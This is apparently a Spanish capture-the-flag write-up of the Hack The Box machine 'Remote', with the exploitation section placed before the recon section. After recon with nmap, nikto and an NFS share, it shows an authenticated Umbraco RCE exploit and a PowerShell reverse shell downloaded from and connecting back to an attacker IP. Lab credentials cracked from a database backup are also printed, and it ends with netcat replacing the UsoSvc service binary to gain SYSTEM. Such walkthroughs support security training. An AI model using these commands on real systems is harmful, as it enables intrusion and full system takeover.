-rwx------ 1 nobody   4294967294   152 Nov  1  2018 default.aspx -rwx------ 1 nobody   4294967294    89 Nov  1  2018 Global.asax drwx------ 2 nobody   4294967294  4096 Feb 20  2020 Media drwx------ 2 nobody   4294967294    64 Feb 20  2020 scripts drwx------ 2 nobody   4294967294  8192 Feb 20  2020 Umbraco drwx------ 2 nobody   4294967294  4096 Feb 20  2020 Umbraco_Client drwx------ 2 nobody   4294967294  4096 Feb 20  2020 Views -rwx------ 1 nobody   4294967294 28539 Feb 20  2020 Web.config  Por suerte, se está compartiendo un backup del sitio Web, por lo que tras googlear un poco dónde se quedan guardadas las credenciales de Umbraco, encontramos el archivo Umbraco.sdf en el directorio App_Data . Al inspeccionar este archivo nos muestra que contiene “data”. Se trata de un archivo que contiene la base de datos. Al hacerle un simple cat se muestran carácteres extraños. Se podría usar algún programa para tratar de visualizar el contenido, pero antes de estar utilizando programas, intento ir de más simple a más complejo, así que le hago un strings para comprobar qué se puede sacar en claro de este archivo. jagelito ~$ file Umbraco.sdf  Umbraco.sdf: data  jagelito ~$ strings Umbraco.sdf | head Administratoradmindefaulten-US Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50 adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749 ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32 @{pv qpkaj  Encontramos que aparecen dos usuarios con lo que parecen dos contraseñas hasheadas.                 Usuario       Hash       Contraseña                       admin@htb.local       b8be16afba8c314ad33d812f22a04991b90e2aaa       baconandcheese                 smith@htb.local       ljxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts=       N/A             Explotación Umbraco CMS Una vez que tenemos un usuario y una contraseña en texto claro, pruebo a acceder a Umbraco y conseguimos loguearnos como administrator. Conseguimos saber qué versión está corriendo.   Una vez sabemos la versión, buscamos exploits disponibles de manera local para tratar de conseguir RCE. Nos creamos un mirror del exploit y le pasamos los parámetros que nos pide. jagelito ~$ searchsploit Umbraco 7.12.4 ------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------  Exploit Title                                                                                                                                              |  Path ------------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                                                                                  | aspx/webapps/46153.py Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                                                                                                  | aspx/webapps/49488.py ------------------------------------------------------------------------------------------------------------------------------------------------------------ -------------------------------  jagelito ~$ python 49488.py -u admin@htb.local -p baconandcheese -i http://remote.htb -c whoami iis apppool\defaultapppool  Tenemos RCE dentro de la máquina, así que ahora se trata de conseguir una shell en ella. Creamos una reverse shell y abrimos un servidor http con python para poder transferirla a la máquina Para crear nuestra reverse shell uso este script: $client = New-Object System.Net.Sockets.TCPClient(&quot;10.10.10.10&quot;,80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()   jagelito ~$ python 49488.py -u admin@htb.local -p baconandcheese -i http://remote.htb -c powershell.exe -a &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.12:8000/rev.ps1&#39;)&quot;  jagelito ~$ sudo python3 -m http.server  Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.10.180 - - [12/Jul/2021 12:23:26] &quot;GET /rev.ps1 HTTP/1.1&quot; 200 -  Una vez transferida la shell a la máquina victima, abrimos el puerto a la escucha con netcat jagelito ~$ sudo nc -lvnp 443 connect to [10.10.14.12] from (UNKNOWN) [10.10.10.180] 49709 PS C:\windows\system32\inetsrv&gt; whoami iis apppool\defaultapppool    Priv. Esc. user.txt PS C:\windows\system32\inetsrv&gt; cd C:\ PS C:\&gt; cd Users PS C:\Users&gt; dir       Directory: C:\Users   Mode                LastWriteTime         Length Name                                                                   ----                -------------         ------ ----                                                                   d-----        2/19/2020   3:12 PM                .NET v2.0                                                              d-----        2/19/2020   3:12 PM                .NET v2.0 Classic                                                      d-----        2/19/2020   3:12 PM                .NET v4.5                                                              d-----        2/19/2020   3:12 PM                .NET v4.5 Classic                                                      d-----        7/11/2021   7:07 PM                Administrator                                                          d-----        2/19/2020   3:12 PM                Classic .NET AppPool                                                   d-r---        2/20/2020   2:42 AM                Public                                                                  PS C:\Users&gt; cd Public  PS C:\Users\Public&gt; dir     Directory: C:\Users\Public   Mode                LastWriteTime         Length Name                                                                   ----                -------------         ------ ----                                                                   d-r---        2/19/2020   3:03 PM                Documents                                                              d-r---        9/15/2018   3:19 AM                Downloads                                                              d-r---        9/15/2018   3:19 AM                Music                                                                  d-r---        9/15/2018   3:19 AM                Pictures                                                               d-r---        9/15/2018   3:19 AM                Videos                                                                 -ar---        7/11/2021   7:07 PM             34 user.txt                                                                 PS C:\Users\Public&gt; type user.txt b200d........................   IIS -&gt; Administrator Comecemos con una enumeración del sistema con winPEAS. Nos lo transferimos a la máquina y lo ejecutamos. PS C:\Users\Public&gt; whoami /priv  PRIVILEGES INFORMATION ----------------------  Privilege Name                Description                               State    ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled SeAuditPrivilege              Generate security audits                  Disabled SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled  SeImpersonatePrivilege        Impersonate a client after authentication Enabled  SeCreateGlobalPrivilege       Create global objects                     Enabled  SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled  PS C:\Users\Public&gt; cd C:/Windows/TEMP  PS C:/Windows/TEMP&gt; iwr -Uri http://10.10.14.12:8000/winPEASx64.exe -Outfile win.exe  PS C:/Windows/TEMP&gt; ./win.exe ...[snip]...    [+] Modifiable Services                                                                                                                                                                       [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services                                                                        LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:                                                                                                                                                    UsoSvc: AllAccess, Start   	 ...[snip]...   Encontramos el servicio UsoSvc, siguiendo la guía de https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md, encontramos que podemos conseguir escalar al usuario Administrator con el CVE-2019-1322. Se trata de una incorrecta administración de permisos en un servicio corriendo bajo NT AUTHORITY/SYSTEM, permitiéndonos reemplazar el binario por netcat y así obtener una reverse como Administrador.  PS C:\Windows\TEMP&gt; iwr -Uri http://10.10.14.12:8000/nc64.exe -Outfile nc.exe   PS C:\Windows\TEMP&gt; sc.exe stop UsoSvc                                                                                                 SERVICE_NAME: UsoSvc                                                                                    TYPE               : 30  WIN32                                                                  STATE              : 3  STOP_PENDING                                                                                    (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)                         WIN32_EXIT_CODE    : 0  (0x0)                                                                   SERVICE_EXIT_CODE  : 0  (0x0)                                                                   CHECKPOINT         : 0x3                                                                        WAIT_HINT          : 0x7530   PS C:\Windows\TEMP&gt; sc.exe config UsoSvc binpath=&quot;C:/Windows/TEMP/nc.exe 10.10.14.12 4444 -e cmd.exe&quot;  [SC] ChangeServiceConfig SUCCESS  PS C:\Windows\TEMP&gt; sc.exe qc usosvc SERVICE_NAME: usosvc                                                                                    TYPE               : 20  WIN32_SHARE_PROCESS                                                    START_TYPE         : 2   AUTO_START  (DELAYED)                                                  ERROR_CONTROL      : 1   NORMAL                                                                 BINARY_PATH_NAME   : C:/Windows/TEMP/nc.exe 10.10.14.12 4444 -e cmd.exe                           LOAD_ORDER_GROUP   :                                                                            TAG                : 0                                                                          DISPLAY_NAME       : Update Orchestrator Service                                                DEPENDENCIES       : rpcss                                                                      SERVICE_START_NAME : LocalSystem   		 PS C:\Windows\TEMP&gt; sc.exe start UsoSvc    En otra terminal, ponemos un puerto a la escucha.  jagelito ~$ sudo rlwrap nc -lvnp 4444 listening on [any] 4444 ... connect to [10.10.14.12] from (UNKNOWN) [10.10.10.180] 49870 Microsoft Windows [Version 10.0.17763.107] (c) 2018 Microsoft Corporation. All rights reserved.  whoami nt authority\system  PS C:\Windows\system32&gt; type C:\Users\Administrator\Desktop\root.txt 386bd................  Máquina pwneada. ">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/ctf-writeups/htb/htb-logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2022-09-24T00:00:00+02:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/ctf%20writeups/remote-htb/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "0xpatea",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+  <meta name="google-site-verification" content="" />
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="0xpatea's blog Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/site_data/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/site_data/favicon-16x16.png">
+<meta name="theme-color" content="#ffffff">
+
+<!--Custom Font-->
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
+  </head>
+
+  <body class="layout--archive wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          0xpatea's blog
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/categories">Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags">Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/whoami">Whoami</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/images/88x88.png" alt="0xpatea" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">0xpatea</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/0xpatea" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/0xpatea" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <div class="archive">
+    
+      <h1 id="page-title" class="page__title">REMOTE HTB MACHINE</h1>
+    
+    <h1 id="remote">REMOTE</h1>
+<h1 id="recon">Recon</h1>
+<h2 id="nmap">Nmap</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           Microsoft ftpd
+|_ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Home - Acme Widgets
+111/tcp   open  rpcbind       2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/tcp6  rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  2,3,4        111/udp6  rpcbind
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100005  1,2,3       2049/tcp   mountd
+|   100005  1,2,3       2049/tcp6  mountd
+|   100005  1,2,3       2049/udp   mountd
+|   100005  1,2,3       2049/udp6  mountd
+|   100021  1,2,3,4     2049/tcp   nlockmgr
+|   100021  1,2,3,4     2049/tcp6  nlockmgr
+|   100021  1,2,3,4     2049/udp   nlockmgr
+|   100021  1,2,3,4     2049/udp6  nlockmgr
+|   100024  1           2049/tcp   status
+|   100024  1           2049/tcp6  status
+|   100024  1           2049/udp   status
+|_  100024  1           2049/udp6  status
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+2049/tcp  open  mountd        1-3 <span class="o">(</span>RPC <span class="c">#100005)</span>
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49678/tcp open  msrpc         Microsoft Windows RPC
+49679/tcp open  msrpc         Microsoft Windows RPC
+49680/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 4m25s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   <span class="nb">date</span>: 2021-07-09T21:28:21
+|_  start_date: N/A
+</code></pre></div></div>
+<p>A simple vista, me llama la atención, el puerto 21, ya que nos permite el logueo anónimo, también tenemos una página web y SMB, además podemos ver que bajo el puerto 111 está corriendo NFS.
+ ## Enumeración FTP - port 21 (TCP)
+ Tras ver que el puerto 21 está abierto y que nos permite el logueo anónimo, probamos a entrar y echar un vistazo a ver si hay algo que nos llame la atención en él, pero no hay nada.</p>
+
+<h2 id="enumeración-web---port-80-tcp">Enumeración Web - port 80 (TCP)</h2>
+<p>Al acceder vemos una “tienda” que ofrece productos de <em>Umbraco</em> . Tras navegar por ella y buscar algún parámetro extraño y revisar el código fuente, no observo nada que me llame la atención. Busco en google “Umbraco” y aparece que es un CMS. Tras haber estado cotilleando un rato por la web y no haber encontrado nada, procedo a enumerar la web con herramientas básicas.
+<img src="/assets/images/ctf-writeups/htb/remote/simple-web.png" alt="image-center" class="align-center" /></p>
+
+<h3 id="nikto">Nikto</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jagelito ~<span class="nv">$ </span>nikto <span class="nt">-h</span> http://remote.htb
+- Nikto v2.1.6
+<span class="nt">---------------------------------------------------------------------------</span>
++ Target IP:          10.10.10.180
++ Target Hostname:    remote.htb
++ Target Port:        80
++ Start Time:         2021-07-12 01:07:18 <span class="o">(</span>GMT2<span class="o">)</span>
+<span class="nt">---------------------------------------------------------------------------</span>
++ Server: No banner retrieved
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="k">in </span>a different fashion to the MIME <span class="nb">type</span>
++ Server banner has changed from <span class="s1">''</span> to <span class="s1">'Microsoft-IIS/10.0'</span> which may suggest a WAF, load balancer or proxy is <span class="k">in </span>place
++ No CGI Directories found <span class="o">(</span>use <span class="s1">'-C all'</span> to force check all possible <span class="nb">dirs</span><span class="o">)</span>
++ Web Server returns a valid response with junk HTTP methods, this may cause <span class="nb">false </span>positives.
++ OSVDB-3092: /home/: This might be interesting...
++ OSVDB-3092: /intranet/: This might be interesting...
++ /umbraco/ping.aspx: Umbraco ping page found
++ 7785 requests: 0 error<span class="o">(</span>s<span class="o">)</span> and 7 item<span class="o">(</span>s<span class="o">)</span> reported on remote host
++ End Time:           2021-07-12 01:14:14 <span class="o">(</span>GMT2<span class="o">)</span> <span class="o">(</span>416 seconds<span class="o">)</span>
+<span class="nt">---------------------------------------------------------------------------</span>
+</code></pre></div></div>
+<p>Nikto nos avisa que existe un directorio llamado <em>Umbraco</em> , al acceder a él vemos que realmente el CMS que se está utilizando es este.
+<img src="/assets/images/ctf-writeups/htb/remote/umbraco_portal.png" alt="image-center" class="align-center" /></p>
+
+<h3 id="dirsearch">Dirsearch</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jagelito ~<span class="nv">$ </span>dirsearch <span class="nt">-u</span> http://remote.htb <span class="nt">-x400</span>,404
+
+  _|. _ _  _  _  _ _|_    v0.4.1
+ <span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10877
+
+Target: http://remote.htb/
+
+<span class="o">[</span>11:31:44] Starting: 
+<span class="o">[</span>11:31:45] 403 -  312B  - /%2e%2e//google.com
+<span class="o">[</span>11:31:45] 200 -    2KB - /.aspx
+<span class="o">[</span>11:31:55] 302 -  126B  - /INSTALL  -&gt;  /umbraco/
+<span class="o">[</span>11:31:55] 302 -  126B  - /Install  -&gt;  /umbraco/
+<span class="o">[</span>11:31:58] 403 -    2KB - /Trace.axd
+<span class="o">[</span>11:32:00] 403 -  312B  - /<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\e</span>tc<span class="se">\p</span>asswd
+<span class="o">[</span>11:32:02] 200 -    2KB - /about-us
+<span class="o">[</span>11:32:23] 200 -    2KB - /blog
+<span class="o">[</span>11:32:23] 200 -    2KB - /blog/
+<span class="o">[</span>11:32:29] 200 -    3KB - /contact.aspx
+<span class="o">[</span>11:32:29] 200 -    3KB - /contact
+<span class="o">[</span>11:32:32] 200 -    2KB - /default.aspx
+<span class="o">[</span>11:32:40] 200 -    2KB - /home
+<span class="o">[</span>11:32:40] 200 -    2KB - /home.aspx
+<span class="o">[</span>11:32:42] 302 -  126B  - /install/  -&gt;  /umbraco/
+<span class="o">[</span>11:32:42] 302 -  126B  - /install  -&gt;  /umbraco/
+<span class="o">[</span>11:32:42] 200 -    1KB - /intranet
+<span class="o">[</span>11:32:48] 500 -    3KB - /master/
+<span class="o">[</span>11:32:54] 200 -    2KB - /people
+<span class="o">[</span>11:33:04] 500 -    3KB - /product
+<span class="o">[</span>11:33:04] 200 -    2KB - /products
+<span class="o">[</span>11:33:04] 200 -    2KB - /products.aspx
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jagelito ~<span class="nv">$ </span>dirsearch <span class="nt">-u</span> http://10.10.10.180/umbraco <span class="nt">-x400</span>,404,403
+
+  _|. _ _  _  _  _ _|_    v0.4.1
+ <span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10877
+
+Target: http://10.10.10.180/umbraco/
+
+<span class="o">[</span>11:36:22] Starting: 
+<span class="o">[</span>11:36:23] 301 -  154B  - /umbraco/js  -&gt;  http://10.10.10.180/umbraco/js/
+<span class="o">[</span>11:36:26] 301 -  159B  - /umbraco/INSTALL  -&gt;  http://10.10.10.180/umbraco/INSTALL/
+<span class="o">[</span>11:36:26] 301 -  159B  - /umbraco/Install  -&gt;  http://10.10.10.180/umbraco/Install/
+<span class="o">[</span>11:36:26] 301 -  158B  - /umbraco/Search  -&gt;  http://10.10.10.180/umbraco/Search/
+<span class="o">[</span>11:36:29] 301 -  159B  - /umbraco/actions  -&gt;  http://10.10.10.180/umbraco/actions/
+<span class="o">[</span>11:36:34] 200 -    2KB - /umbraco/application
+<span class="o">[</span>11:36:34] 200 -    3KB - /umbraco/application/logs/
+<span class="o">[</span>11:36:34] 200 -    3KB - /umbraco/application/
+<span class="o">[</span>11:36:34] 200 -    3KB - /umbraco/application/cache/
+<span class="o">[</span>11:36:34] 301 -  158B  - /umbraco/assets  -&gt;  http://10.10.10.180/umbraco/assets/
+<span class="o">[</span>11:36:37] 301 -  158B  - /umbraco/config  -&gt;  http://10.10.10.180/umbraco/config/
+<span class="o">[</span>11:36:38] 301 -  161B  - /umbraco/dashboard  -&gt;  http://10.10.10.180/umbraco/dashboard/
+<span class="o">[</span>11:36:38] 200 -    4KB - /umbraco/default
+<span class="o">[</span>11:36:38] 301 -  161B  - /umbraco/developer  -&gt;  http://10.10.10.180/umbraco/developer/
+<span class="o">[</span>11:36:41] 301 -  159B  - /umbraco/install  -&gt;  http://10.10.10.180/umbraco/install/
+<span class="o">[</span>11:36:42] 301 -  155B  - /umbraco/lib  -&gt;  http://10.10.10.180/umbraco/lib/
+<span class="o">[</span>11:36:42] 301 -  163B  - /umbraco/lib/tinymce  -&gt;  http://10.10.10.180/umbraco/lib/tinymce/
+<span class="o">[</span>11:36:43] 200 -  657B  - /umbraco/logout.aspx
+<span class="o">[</span>11:36:43] 301 -  159B  - /umbraco/members  -&gt;  http://10.10.10.180/umbraco/members/
+<span class="o">[</span>11:36:46] 301 -  159B  - /umbraco/plugins  -&gt;  http://10.10.10.180/umbraco/plugins/
+<span class="o">[</span>11:36:48] 301 -  158B  - /umbraco/search  -&gt;  http://10.10.10.180/umbraco/search/
+<span class="o">[</span>11:36:48] 301 -  160B  - /umbraco/settings  -&gt;  http://10.10.10.180/umbraco/settings/
+<span class="o">[</span>11:36:52] 301 -  157B  - /umbraco/views  -&gt;  http://10.10.10.180/umbraco/views/
+</code></pre></div></div>
+<p>Tras estar un rato “cotilleando” y fuzeando la web, no encuentro nada interesante, ni credenciales que se hayan podido dejar sin querer en algún archivo. Pruebo credenciales por defecto en la página de logueo de <em>Umbraco</em>, pero nada funciona.</p>
+
+<h2 id="enumeración-smb---port-139445-tcp">Enumeración SMB - port 139,445 (TCP)</h2>
+<p>Al ver estos puertos abiertos pruebo a enumerar algún recurso que se esté compartiendo bajo una null session, pero no nos deja acceder</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jagelito ~<span class="nv">$ </span>crackmapexec smb <span class="nt">--shares</span> 10.10.10.180 <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span>
+SMB         10.10.10.180    445    REMOTE           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:REMOTE<span class="o">)</span> <span class="o">(</span>domain:remote<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.180    445    REMOTE           <span class="o">[</span>-] remote<span class="se">\:</span> STATUS_ACCESS_DENIED 
+SMB         10.10.10.180    445    REMOTE           <span class="o">[</span>-] Error enumerating shares: Error occurs <span class="k">while </span>reading from remote<span class="o">(</span>104<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="enumeración-nfs---port-111-tcp">Enumeración NFS - port 111 (TCP)</h2>
+<p>Al ver que bajo el puerto 111 está corriendo NFS (Network File System), pruebo a ver si aquí hay algún recurso compartido.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jagelito ~<span class="nv">$ </span>showmount <span class="nt">-e</span> remote.htb
+Export list <span class="k">for </span>remote.htb:
+/site_backups <span class="o">(</span>everyone<span class="o">)</span>
+
+jagelito ~<span class="nv">$ </span><span class="nb">sudo </span>mount <span class="nt">-t</span> nfs 10.10.10.180:/site_backups content/nfs/backup_mnt/ <span class="nt">-nolock</span>
+
+jagelito ~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> content/nfs/backup_mnt/
+total 123
+drwx------ 2 nobody   4294967294  4096 Feb 23  2020 <span class="nb">.</span>
+drwxr-xr-x 3 jagelito jagelito    4096 Jul  9 23:47 ..
+drwx------ 2 nobody   4294967294    64 Feb 20  2020 App_Browsers
+drwx------ 2 nobody   4294967294  4096 Feb 20  2020 App_Data
+drwx------ 2 nobody   4294967294  4096 Feb 20  2020 App_Plugins
+drwx------ 2 nobody   4294967294    64 Feb 20  2020 aspnet_client
+drwx------ 2 nobody   4294967294 49152 Feb 20  2020 bin
+drwx------ 2 nobody   4294967294  8192 Feb 20  2020 Config
+drwx------ 2 nobody   4294967294    64 Feb 20  2020 css
+<span class="nt">-rwx------</span> 1 nobody   4294967294   152 Nov  1  2018 default.aspx
+<span class="nt">-rwx------</span> 1 nobody   4294967294    89 Nov  1  2018 Global.asax
+drwx------ 2 nobody   4294967294  4096 Feb 20  2020 Media
